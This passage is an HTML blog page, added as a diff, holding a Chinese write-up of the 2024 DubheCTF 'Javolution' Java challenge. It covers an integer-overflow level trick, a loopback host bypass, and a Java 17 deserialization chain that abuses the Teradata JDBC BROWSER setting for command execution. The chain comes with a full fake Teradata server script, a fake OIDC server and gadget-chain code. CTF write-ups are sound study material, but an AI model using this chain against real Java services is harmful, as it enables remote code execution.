@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <meta property="og:site_name" content="s3ven&#39;s blog">
+  
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>2024 DubheCTF WriteUp | s3ven&#39;s blog</title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container-wider post-details" id="post-details">
+    <div class="zoom-wrap">
+      <div class="post-content">
+        <div class="post-title">2024 DubheCTF WriteUp</div>
+        <div class="post-attach">
+          <span class="post-pubtime">
+            <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+            2024-03-18
+          </span>
+          
+                <span class="post-categories">
+                  <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                  
+                  <span class="span--category">
+                    <a href="../../categories/write-up/" title="Write Up">
+                      Write Up
+                    </a>
+                  </span>
+                  
+                </span>
+            
+                <span class="post-tags">
+                  <i class="iconfont icon-tags mr-10" title="标签"></i>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/java/" title="Java">
+                      #Java
+                    </a>
+                  </span>
+                  
+                </span>
+            
+        </div>
+        <div class="markdown-body">
+          
+<style id="hexo-wm">
+.hexo-wm {
+  color: transparent !important;
+  opacity: 0 !important;
+  font-size: 0 !important;
+  line-height: 0 !important;
+  pointer-events: none !important;
+  user-select: text !important;
+  -webkit-user-select: text !important;
+  speak: none !important;
+  vertical-align: baseline !important;
+  display: inline !important;
+}
+
+.hexo-wm * { color: transparent !important; opacity: 0 !important; }
+</style>
+<html><head></head><body><h1 id="Javolution"><a href="#Javolution" class="headerlink" title="Javolution"></a>Javolution</h1><h2 id="反序列化部分入口点"><a href="#反序列化部分入口点" class="headerlink" title="反序列化部分入口点"></a>反序列化部分入口点</h2><p><img src="image-1.png" alt="image-1.png"></p>
+<p><img src="image-2.png" alt="image-2.png"></p>
+<p><img src="image-3.png" alt="image-3.png"></p>
+<p>要到达触发反序列化语句部分，<span class="hexo-wm">s‍⑶𝐯ｅｎ.﻿𝐬i​𝒕𝘦‍</span>需要满足以下条件：</p>
+<ul>
+<li>Player <span class="hexo-wm">𝘴﻿³𝘷en․‍𝐬ｉ‍𝘵℮​</span>玩家等级达到50级</li>
+<li>传入的 host 包含 <code>dubhe</code> 字段且是回环地址</li>
+</ul>
+<h2 id="一、整数溢出漏洞"><a href="#一、整数溢出漏洞" class="headerlink" title="一、整数溢出漏洞"></a>一、整数溢出漏洞</h2><p>jar 包内 <code>/pal</code> 路由部分实现了一个较为完整的交<span class="hexo-wm">𝒔‍𝟯v𝐞n.‍s𝘪﻿﻿𝘵𝐞﻿​</span>互式幻兽帕鲁游戏，提供以下操作接口：</p>
+<ul>
+<li><p><code>/capture</code> 用于捕捉帕鲁，仅当待捕捉帕鲁的等级在 Player <span class="hexo-wm">𝘀‍‍⑶𝘷ℯｎ․‌​𝘀i‌ｔ℮‌​</span>等级+10 级 以内才能捕捉成功</p>
+<p>  捕捉成功后 <span class="hexo-wm">ѕ‍⑶ⅴ𝐞𝘯∙​‌𝘴ⅈ‍‌𝒕ｅ‍‌</span>Player 将变为被捕捉的帕鲁</p>
+</li>
+<li><p><code>/battle/{boss}</code> 路由用于与帕鲁战斗，<span class="hexo-wm">𝘴﻿​³𝒗en．﻿‌𝘴ｉ‌𝐭℮‍﻿</span>通过一个特定的函数判断双方能力：</p>
+</li>
+</ul>
+<p><img src="image-4.png" alt="image-4.png"></p>
+<p>如果 Player 能力大于目标帕鲁的能力，则战斗成功，<span class="hexo-wm">s​​3𝒗eｎ．‌ѕⅈ​‍𝒕e‍</span>Player 等级升至目标帕鲁的等级</p>
+<ul>
+<li><p><code>/cheat</code> 在 GET 路由中可以修改当前 Player 的 <span class="hexo-wm">𝒔﻿3vｅ𝒏·‌𝐬ｉ​𝘵𝘦﻿‍</span>hp、attack <span class="hexo-wm">ѕ‌³𝒗𝘦ｎ．﻿‍𝘴i﻿‌ｔ℮​﻿</span>和 defense，但需要满足</p>
+<p>  <code>hp &lt;= level * 200</code> 、<code>attack &lt;= level * 20</code> 和 <code>defense &lt;= level * 20</code></p>
+</li>
+<li><p><code>/cheat</code> 在 POST 路由中用于触发 Java <span class="hexo-wm">𝘴​‍⑶ⅴeｎ•‌𝘀i﻿𝐭ｅ‍</span>反序列化，需要满足前述条件才能到达触发部分</p>
+</li>
+</ul>
+<p>游戏部分提供了如下帕鲁：</p>
+<p><img src="image-5.png" alt="image-5.png"></p>
+<p>为了提供更高的游戏趣味性和随机性，<span class="hexo-wm">ꜱ﻿⑶𝘷℮n∙​﻿𝐬ⅈ​​𝐭℮​​</span>游戏中还提供了如下生成波动函数：</p>
+<p><img src="image-6.png" alt="image-6.png"></p>
+<p><img src="image-7.png" alt="image-7.png"></p>
+<p>和元素克制逻辑：</p>
+<p><img src="image-8.png" alt="image-8.png"></p>
+<p>由于出题人的精心设计：</p>
+<ul>
+<li>Grizzbolt 和 <span class="hexo-wm">s​﻿3𝘷ｅｎ∙​𝐬i‌𝐭𝐞﻿‍</span>Jetragon 的等级差值为 20</li>
+<li>初始值波动范围为 0.<span class="hexo-wm">ѕ﻿‍3𝒗𝘦𝐧․​ѕ𝐢​​𝒕e‍﻿</span>9 - 1.1</li>
+<li>元素克制加成为 1.<span class="hexo-wm">ѕ​3ⅴｅ𝘯•‌﻿ꜱi﻿﻿t𝐞​</span>0 或 1.5</li>
+<li><code>/cheat</code> GET路由部<span class="hexo-wm">ꜱ﻿𝟯ⅴｅ𝘯·​𝐬𝘪﻿‌𝒕℮‍</span>分的设置限制</li>
+</ul>
+<p>无法通过正常方法 <code>battle</code> 赢 Jetr<span class="hexo-wm">𝘴﻿3ⅴ𝐞𝐧．﻿𝘴ⅈ​𝘵ｅ﻿​</span>agon 或 <code>capture</code> 到 Jetragon</p>
+<blockquote>
+<p>💡 因此此处需要<span class="hexo-wm">𝘀‌3𝐯e𝐧․﻿<span class="hexo-wm">ѕ‌‍⑶ve𝒏•﻿ѕⅈ‍‌t𝐞​</span>‌𝐬𝘪‌‌t𝐞​‍</span>使用 整除溢出漏洞</p>
+</blockquote>
+<p>首先 <code>/cheat</code> 的 GET 路由部分使用了 <code>intValue()</code> 函数，且限制了<span class="hexo-wm">𝐬‍⑶𝐯ｅ𝐧．﻿‌𝒔i‌﻿t𝐞​</span>传入数据为 <code>Integer</code> ，如果传入过大或过小的数字，会被当成字符串报错，所以此处是无法使用溢出漏洞的</p>
+<p>因此考虑在后续对 hp attack 和 <span class="hexo-wm">𝐬​﻿3𝐯ℯ𝒏․﻿𝘴i‌​t𝐞‌</span>defense 的运算中使用整数溢出漏洞：</p>
+<p><img src="image-9.png" alt="image-9.png"></p>
+<p>由于 <code>/cheat</code> 的 GET 路由部分仅限制了 <code>hp &lt;= level * 200</code> 、<code>attack &lt;= level * 20</code> 和 <code>defense &lt;= level * 20</code> ，因此我们可以传入<span class="hexo-wm">𝘀​³𝐯ｅｎ·‌𝐬ｉ‌‍𝒕℮‍﻿</span>一个很小的但不溢出的负数：</p>
+<pre class="language-jsx" data-language="jsx"><code class="language-jsx">hp<span class="token operator">=</span><span class="token number">0</span> attack<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2147483648</span> defense<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2147483648</span></code></pre>
+
+<p>此时 <code>myPower</code> 由于 <code>hp=0</code> 而变为 0</p>
+<p><code>opponentPower</code> 由于 <code>opponentdamage</code> 计算过程中发生溢<span class="hexo-wm">s﻿³v𝘦n·‌​ѕｉ‌ｔe﻿﻿</span>出成为0 而变为0</p>
+<p>因此最后得以 <code>battle</code> 成功升入 50 级</p>
+<h2 id="二、host-绕过"><a href="#二、host-绕过" class="headerlink" title="二、host 绕过"></a>二、host 绕过</h2><p>该部分需要满足以下条件：</p>
+<ul>
+<li>传入的 host 包含 <code>dubhe</code> 字段</li>
+<li>传入的 hos<span class="hexo-wm">𝒔‍³𝒗e𝘯∙​ѕⅈ‌ｔ℮‌​</span>t 是回环地址</li>
+</ul>
+<p>可以通过设置一个公网 DNS <span class="hexo-wm">ꜱ‌‌3𝘷ｅ𝐧.‍ѕⅈ‌ｔe‌‍</span>解析到回环地址来绕过，同时可能由于远程进行了相应设置，可以使用 <code>dubhe.localhost</code> 绕过校验部分</p>
+<h2 id="三、反序列化部分"><a href="#三、反序列化部分" class="headerlink" title="三、反序列化部分"></a>三、反序列化部分</h2><p>反序列化入口点是一个常见的 <code>readObject()</code> 函数，查看 pom.xml 如下：</p>
+<p><img src="image-10.png" alt="image-10.png"></p>
+<p><img src="image-11.png" alt="image-11.png"></p>
+<p>发现这是基于 <span class="hexo-wm">ꜱ‌﻿⑶𝒗𝘦n．​‍𝘀i﻿𝘵℮‌</span>Java 17 的高版本反序列化</p>
+<p>由于依赖中没有提供常用的 CommonCollection 链和 CommonBeanutil <span class="hexo-wm">𝒔‍﻿⑶ⅴe𝐧․‍ѕｉ‌𝐭℮﻿</span>链，只能尝试从 Jackson 链尝试突破</p>
+<p>且此处引入的 teradata jdbc <span class="hexo-wm">𝘀‍𝟯ⅴ𝘦ｎ.​﻿𝒔ｉ‍‌𝒕e‌</span>并没有在前述逻辑中使用，应当是绕过高版本 Java 限制的一个工具</p>
+<p>先在 <code>com.teradata.jdbc</code> 包中进行危险<span class="hexo-wm">𝐬‌​𝟯𝒗𝘦n．﻿ꜱ𝘪﻿‌ｔ𝘦​</span>函数的查找：</p>
+<p><img src="image-12.png" alt="image-12.png"></p>
+<p>发现在其原设计为调用浏览器的逻辑部分存在 <code>Runtime.getRuntime().exec()</code> 危险函数的调用</p>
+<p>找了半天终于在 blackhat <span class="hexo-wm">ꜱ‍3vｅ𝘯．‍𝒔ｉ​‌𝒕𝘦‍</span>里找到了相关的漏洞说明：</p>
+<p><img src="image-13.png" alt="image-13.png"></p>
+<p><img src="image-14.png" alt="image-14.png"></p>
+<p>Teradata JDBC 在通过浏览器设置 SSO 登录时会调用 <code>Runtime.getRuntime().exec()</code> 用于启动指定的浏览器进行 SSO <span class="hexo-wm">𝒔​3𝘷ｅ𝒏．‍ꜱ𝐢‍﻿ｔｅ‍‌</span>验证，此处存在漏洞可进行任意命令执行</p>
+<blockquote>
+<p>攻击路径如下：</p>
+<ol>
+<li>JDBC Client 连接到 <span class="hexo-wm">𝘀‍﻿⑶𝐯𝐞𝒏.‍‌𝘴i‍ｔ𝐞​‍</span>Fake Teradata Server</li>
+<li>Fake Teradata Server 告诉 <span class="hexo-wm">s​³𝘷𝐞𝒏•‌ѕ𝐢‍𝘵𝐞‌﻿</span>JDBC Client OIDC 已启用</li>
+<li>JDBC Client 向 OIDC <span class="hexo-wm">s﻿⑶ⅴ𝘦𝒏•<span class="hexo-wm">𝘀‌3𝒗ｅｎ․​‍ѕ𝘪​𝐭𝐞​​</span>‍s𝘪‌‌ｔe‍</span>服务器发出 URL 请求，需要具有 openid-configuration 格式的 JSON 返回</li>
+<li>JDBC Client 执行 <span class="hexo-wm">s﻿3v℮𝘯．​﻿ꜱⅈ​​ｔｅ‍</span>BROWSER 属性中的命令</li>
+</ol>
+</blockquote>
+<p>首先启用一个 Fake <span class="hexo-wm">ѕ‍‍𝟯𝐯eｎ.‍‌ꜱi﻿‌t𝘦﻿‌</span>Teradata Server：</p>
+<p><img src="image-15.png" alt="image-15.png"></p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Script fakeserver.py from Vidar-Team 1ue</span>
+<span class="token keyword">import</span> asyncore
+<span class="token keyword">import</span> logging
+<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> struct
+
+<span class="token keyword">class</span> <span class="token class-name">teradata_request_handler</span><span class="token punctuation">(</span>asyncore<span class="token punctuation">.</span>dispatcher_with_send<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> sock<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        asyncore<span class="token punctuation">.</span>dispatcher_with_send<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> sock<span class="token operator">=</span>sock<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>addr <span class="token operator">=</span> addr
+        self<span class="token punctuation">.</span>packet_to_send <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'03020a0000070000'</span><span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;H"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">899</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'000000000000000000000000000000000000000000010000000005ff0000000000000000000000000000002b024e000003e8000003e80078000177ff0000000200000001ff000004be00555446313620202020202020202020202020202020202020202020202020bf00555446382020202020202020202020202020202020202020202020202020ff00415343494920202020202020202020202020202020202020202020202020c0004542434449432020202020202020202020202020202020202020202020204e0100010001540007008c310000640000fa00000f4240000000007cff06000070000000fff80000000100000000bf000000100000ffff000008000000008000000040000009e7000fa0000000f23000007918000000260000fa000000fa000000fa0000007d0000007d000000fa000000fa00000009e7000000060000000600000006000003e8000fa00000fffc00000fffb40000fa000009000101000a001c01010101010101020100010100010101010201010001010101010102000b002201010101010001010101010102010101010101010001010101010101010001010000000c0006010001020101000d003e31372e32302e30332e30392020202020202020202020202020202020202031372e32302e30332e3039202020202020202020202020202020202020202020000e000403030203000f00280100000100010100000101000001000100010001000000000000000000000001010001000100000100100014000000000000000000008002000000000000000000120020010101010101010100000000000000000000000000000000000000000000000000130008010101000000000000060002014900a5'</span><span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;H"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">87</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'0000000100010005010002000811140309000300040004000600210006000400050004000700040008000400090004000a000501000b000501000c000501000e0004001000060100000f'</span><span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;H"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'000372636500'</span><span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>url<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'00a70031000000010000000d2b06010401813f0187740101090010000c00000003000000010011000c000000010000001400a70024000000010000000c2b06010401813f01877401140011000c000000010000004600a7002100000001000000092a864886f7120102020011000c000000010000002800a7001e00000001000000062b06010505020011000c000000010000004100a70025000000010000000d2b0601040181e01a04822e01040011000c000000010000001e00a70025000000010000000d2b0601040181e01a04822e01030011000c000000010000000a'</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>ibuffer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">def</span> <span class="token function">handle_read</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        data <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8192</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> data<span class="token punctuation">:</span>
+            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'[+]Data received: {}{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'[+]Data sending: {}{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>packet_to_send<span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>self<span class="token punctuation">.</span>packet_to_send<span class="token punctuation">)</span>
+
+<span class="token keyword">class</span> <span class="token class-name">TeradataServer</span><span class="token punctuation">(</span>asyncore<span class="token punctuation">.</span>dispatcher<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        asyncore<span class="token punctuation">.</span>dispatcher<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>create_socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>set_reuse_addr<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Server running on </span><span class="token interpolation"><span class="token punctuation">{</span>host<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">def</span> <span class="token function">handle_accept</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        pair <span class="token operator">=</span> self<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> pair <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            sock<span class="token punctuation">,</span> addr <span class="token operator">=</span> pair
+            handler <span class="token operator">=</span> teradata_request_handler<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token string">"http://&lt;server_ip&gt;:5555/a"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>
+    server <span class="token operator">=</span> TeradataServer<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">10250</span><span class="token punctuation">)</span>
+    asyncore<span class="token punctuation">.</span>loop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>然后启用一个 fakesso server ，<span class="hexo-wm">ѕ﻿﻿𝟯𝐯ℯｎ∙​𝐬i​​t𝘦﻿</span>用于返回  openid-configuration 格式的 json</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Script fakesso.py from Vidar-Team 1ue</span>
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">import</span> json
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/a"</span><span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/a/.well-known/openid-configuration"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    dddata<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">"authorization_endpoint"</span><span class="token punctuation">:</span><span class="token string">"1ue"</span><span class="token punctuation">,</span>
+        <span class="token string">"token_endpoint"</span><span class="token punctuation">:</span><span class="token string">"vidar"</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>dddata<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5555</span><span class="token punctuation">)</span></code></pre>
+
+<p>由于漏洞说明中仅给出了基于 CommonBeanutil 链的绕过高版本方法，<span class="hexo-wm">𝘀​​³ⅴ𝐞𝘯.‍‌sⅈ‍𝐭℮﻿‌</span>因此我们需要手动构造 Jackson 链来调用 TeradataSource 的 getter 方法触发连接</p>
+<p>首先是 dataS<span class="hexo-wm">𝘀‌​³ⅴℯｎ∙​s𝘪‍𝘵e‌</span>ource 部分的构造：</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> command <span class="token operator">=</span> <span class="token string">"calc.exe"</span><span class="token punctuation">;</span>
+<span class="token class-name">TeraDataSource</span> dataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TeraDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dataSource<span class="token punctuation">.</span><span class="token function">setBROWSER</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
+dataSource<span class="token punctuation">.</span><span class="token function">setLOGMECH</span><span class="token punctuation">(</span><span class="token string">"BROWSER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dataSource<span class="token punctuation">.</span><span class="token function">setDSName</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dataSource<span class="token punctuation">.</span><span class="token function">setDbsPort</span><span class="token punctuation">(</span><span class="token string">"10250"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>首先尝试了 <code>BadAttributeValueExpException.toString -&gt; POJONode -&gt; jackson反序列化-&gt;getter</code></p>
+<p>但是实测 <code>BadAttributeValueExpException</code> 触发 <code>toString</code> 只能在 Java 8 中成功触发，而在 Java <span class="hexo-wm">ѕ‍𝟯𝘷𝐞𝘯․‌‍ѕ𝘪‌𝒕℮​​</span>17 中无法使用，因此需要寻找其他 from readObject to obj.toString 路径链：</p>
+<p><a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/util/PayloadHelper.java#L311">https://github.com/wh1t3p1g/ysomap/blob/master/c<span class="hexo-wm">𝐬‍𝟯𝐯𝘦𝐧․‍‌sｉ‍ｔ𝐞﻿</span>ore/src/main/java/ysomap/core/util/PayloadHelper.java#L311</a></p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">EventListenerList</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventListenerList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">UndoManager</span> manager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UndoManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Vector</span> vector <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Vector</span><span class="token punctuation">)</span> <span class="token class-name">ReflectionHelper</span><span class="token punctuation">.</span><span class="token function">getFieldValue</span><span class="token punctuation">(</span>manager<span class="token punctuation">,</span> <span class="token string">"edits"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+vector<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">ReflectionHelper</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token string">"listenerList"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">InternalError</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> manager<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>如果直接使用上述链子，在 jackson <span class="hexo-wm">ѕ‌​𝟯ⅴ𝐞𝐧·​‍𝘴ｉ‍​ｔ𝐞​</span>链在循环调用 getter 时会由于顺序问题导致反序列化触发失败：</p>
+<pre class="language-java" data-language="java"><code class="language-java">getter definitions <span class="token keyword">for</span> property <span class="token string">"databaseName"</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>teradata<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span>TeraDataSourceBase</span>#<span class="token function">getdatabaseName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> vs <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>teradata<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span>TeraDataSourceBase</span>#<span class="token function">getDatabaseName</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>需要使用 <code>org.springframework.aop.framework.JdkDynamicAopProxy</code> 类代理解决：</p>
+<blockquote>
+<p>JdkDynamicAopProxy&nbsp;类的&nbsp;advised&nbsp;成员是&nbsp;<code>org.springframework.aop.framework.AdvisedSupport</code>&nbsp;类型的对象，它的&nbsp;targetSource&nbsp;成员中保存了&nbsp;J<span class="hexo-wm">𝘴‌3ⅴｅｎ․<span class="hexo-wm">ꜱ﻿‍𝟯𝒗𝐞𝒏.‌‍𝒔i‌‍t𝘦​﻿</span>‍𝒔ⅈ‍𝐭𝘦﻿</span>dkDynamicAopProxy&nbsp;类代理的接口的实现类</p>
+</blockquote>
+<blockquote>
